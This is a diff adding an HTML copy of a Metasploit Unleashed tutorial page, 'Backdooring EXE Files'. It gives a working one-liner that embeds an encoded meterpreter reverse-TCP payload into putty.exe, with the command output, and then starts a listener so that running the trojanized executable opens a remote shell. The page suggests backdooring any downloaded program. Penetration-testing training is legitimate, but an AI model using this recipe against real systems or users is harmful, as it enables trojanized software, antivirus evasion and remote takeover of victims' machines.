@@ -1,0 +1,43 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Backdooring EXE Files</title>
+</head>
+<body>
+<h1 id="firstHeading" class="firstHeading">Backdooring EXE Files</h1>
+<h3 id="siteSub">From Metasploit Unleashed - Mastering The Framework</h3>
+<p>With one of the latest revisions to Metasploit came an added feature
+that often took a long period of time to do manually as attackers. The
+ability to embed a Metasploit Payload in any executable that you want
+to is simply brilliant. When I say any executable, its any executable.
+You want to backdoor something you download from the internet? How
+about iexplorer? Or explorer.exe or putty, any of these would work.
+Best part about it is its extremely simple. Here is a one liner on how
+to take whatever executable you want and embed whatever payload you
+want.
+<br>
+<br>
+</p>
+<pre>root@bt:/pentest/exploits/framework3# <span
+ style="color: rgb(51, 153, 102);">./msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.1.132 LPORT=8080 R | ./msfencode -t exe -x /tmp/putty.exe -o /tmp/putty_backdoored.exe -e x86/shikata_ga_nai -c 5</span><br><span
+ style="color: rgb(51, 51, 153);">[*]</span> x86/shikata_ga_nai succeeded with size 927 (iteration=1)<br><span
+ style="color: rgb(51, 51, 153);">[*]</span> x86/shikata_ga_nai succeeded with size 1023 (iteration=2)<br><span
+ style="color: rgb(51, 51, 153);">[*]</span> x86/shikata_ga_nai succeeded with size  1093(iteration=3)<br><span
+ style="color: rgb(51, 51, 153);">[*]</span> x86/shikata_ga_nai succeeded with size 1193 (iteration=4)<br><span
+ style="color: rgb(51, 51, 153);">[*]</span> x86/shikata_ga_nai succeeded with size 1248 (iteration=5)<br><br>root@bt:/pentest/exploits/framework3# <span
+ style="color: rgb(51, 153, 102);">./msfcli exploit/multi/handler payload=shikata_ga_nai lhost=10.10.1.231 lport=8080 payload=windows/meterpreter/reverse_tcp E</span><br><span
+ style="color: rgb(51, 51, 153);">[*]</span> Please wait while we load the module tree...<br><span
+ style="color: rgb(51, 51, 153);">[*]</span> Started reverse handler on port 8080<br><span
+ style="color: rgb(51, 51, 153);">[*]</span> Starting the payload handler...</pre>
+<br>
+Now click on putty.exe and have your listener up and you've now
+backdoored your first executable and enjoy your meterpreter shell.
+<br>
+<br>
+<div style="text-align: center;"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/MSF_Extended_Usage"
+ title="MSF Extended Usage">MSF Extended Usage</a></div>
+</body>
+</html>
